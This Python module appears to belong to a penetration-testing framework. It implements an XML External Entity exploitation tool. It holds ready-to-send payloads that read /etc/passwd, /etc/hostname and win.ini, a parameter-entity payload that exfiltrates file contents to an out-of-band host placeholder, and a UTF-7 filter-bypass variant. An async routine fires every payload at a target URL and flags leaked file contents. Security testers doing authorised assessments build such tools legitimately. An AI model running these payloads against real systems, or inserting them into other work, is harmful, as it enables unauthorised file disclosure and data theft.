"""
XXETool â€” XML External Entity injection exploitation.

Tests for:
- Classic XXE (file read)
- Blind XXE (out-of-band data exfil)
- XXE via SVG, DOCX, XLSX
- Parameter entity injection
"""
import aiohttp

from sentinel.tools.base import ToolOutput
from sentinel.logging_config import get_logger

logger = get_logger(__name__)


class XXETool:
    name = "xxe_exploit"
    description = "Test for XML External Entity injection"

    PAYLOADS = {
        "classic_file_read": '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        "<root><data>&xxe;</data></root>",

        "classic_windows": '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
        "<root><data>&xxe;</data></root>",

        "parameter_entity": '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE foo [\n"
        '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
        '  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://SENTINEL_OOB_HOST/?data=%xxe;\'>">\n'
        "  %eval;\n"
        "  %exfil;\n"
        "]>\n"
        "<root>test</root>",

        "cdata_exfil": '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE foo [\n"
        '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
        "]>\n"
        "<root><![CDATA[&xxe;]]></root>",

        "utf7_bypass": '<?xml version="1.0" encoding="UTF-7"?>\n'
        "+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-\n"
        "+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-",
    }

    async def execute(
        self,
        target_url: str,
        method: str = "POST",
        content_type: str = "application/xml",
        headers: dict = None,
    ) -> ToolOutput:
        findings = []
        http_traces = []
        all_headers = {"Content-Type": content_type}
        if headers:
            all_headers.update(headers)

        async with aiohttp.ClientSession() as session:
            for name, payload in self.PAYLOADS.items():
                try:
                    async with session.request(
                        method,
                        target_url,
                        data=payload,
                        headers=all_headers,
                        timeout=aiohttp.ClientTimeout(total=10),
                    ) as resp:
                        body = await resp.text()
                        trace = {
                            "method": method,
                            "url": target_url,
                            "payload_name": name,
                            "status": resp.status,
                            "body": body[:2000],
                        }
                        http_traces.append(trace)

                        # Check for file content indicators
                        indicators = ["root:", "daemon:", "[extensions]", "localhost", "SENTINEL"]
                        for indicator in indicators:
                            if indicator in body:
                                findings.append(
                                    {
                                        "payload": name,
                                        "evidence": body[:500],
                                        "indicator": indicator,
                                    }
                                )
                                logger.info(f"XXE confirmed with payload: {name}")
                                break

                except Exception as e:
                    logger.debug(f"XXE payload {name} failed: {e}")

        return ToolOutput(
            success=len(findings) > 0,
            data={"findings": findings},
            tool_name=self.name,
            metadata={"http_traces": http_traces},
        )
